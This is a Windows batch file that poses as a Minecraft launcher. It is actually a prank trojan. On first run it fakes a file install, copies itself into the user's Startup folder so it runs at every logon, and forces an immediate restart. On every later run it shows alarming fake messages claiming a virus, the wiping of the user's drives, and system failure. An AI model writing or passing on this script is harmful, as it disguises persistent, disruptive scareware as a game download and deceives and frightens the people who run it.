@echo off
color 07
cls
echo Microsoft Windows [Version 11.0.22631.4037]
echo (c) Microsoft Corporation. All rights reserved.
echo.

:: Check if the variable "MyVar" is set
set MyVarStatus=
for /f "tokens=2 delims==" %%A in ('set MyVar 2^>nul') do set MyVarStatus=%%A

if "%MyVarStatus%" == "" (
    :: Set the variable permanently so it persists after a reboot
    setx MyVar 1 >nul
    echo Looking for existing files...
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo.
    echo Existing files not found. Attempting install for new files...
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul 
    echo .
    timeout /t 1 /nobreak >nul
    echo.
    move /y "C:\Users\%USERNAME%\Downloads\MinecraftLauncher.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MinecraftLauncher.bat"
    echo Download failed. Device restart is recommended.
    echo Press any key to restart
    timeout /t 100 >nul
    shutdown /r /t 0

) else (
    echo Warning
    color 04
    timeout /t 3 /nobreak >nul
    echo Your computer has detected a virus
    timeout /t 3 /nobreak >nul
    echo Attempting to remove virus...
    timeout /t 3 /nobreak >nul
    echo Your hard drives and solid state drives are now being wiped.
    echo Please wait...
    timeout /t 3 /nobreak >nul
    echo.
    echo.
    echo.
    echo          ERROR: SYSTEM FAILURE IMMINENT
    echo          UNAUTHORIZED ACCESS DETECTED
    echo          SYSTEM RESTARTING IN 3
    echo.
    echo.
    timeout /t 1 /nobreak >nul
    cls
    echo System failure averted. Resuming normal operations...
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 1 /nobreak >nul
    echo .
    timeout /t 2 /nobreak >nul
    echo ERROR
    echo ERROR
    echo ERROR
    echo ERROR
    echo ERROR
    timeout /t 2 /nobreak >nul
    echo SYSTEM CORRUPTED
    timeout /t 3 /nobreak >nul
)
